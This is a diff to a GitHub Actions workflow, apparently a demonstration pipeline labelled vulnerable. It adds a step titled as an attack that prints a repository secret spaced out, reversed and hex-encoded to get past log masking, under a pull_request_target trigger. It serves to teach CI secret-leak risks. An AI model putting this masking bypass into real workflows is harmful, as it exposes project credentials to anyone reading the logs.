@@ -1,6 +1,6 @@
 name: Vulnerable Pipeline
 on:
-  pull_request_target:  # ⚠️ Changement ICI
+  pull_request_target:
     types: [opened, synchronize]
 
 jobs:
@@ -16,5 +16,20 @@ jobs:
         run: |
           echo "===== Step légitime ====="
           echo "Valeur secrète masquée : $DEMO_SECRET"
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
+      
+      - name: ATTAQUE - Exfiltration du secret
+        run: |
+          echo "Technique 1 - Espaces entre caractères:"
+          echo "$DEMO_SECRET" | sed 's/./& /g'
+          
+          echo ""
+          echo "Technique 2 - Reverse:"
+          echo "$DEMO_SECRET" | rev
+          
+          echo ""
+          echo "Technique 3 - Hexadécimal:"
+          echo "$DEMO_SECRET" | xxd -p
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
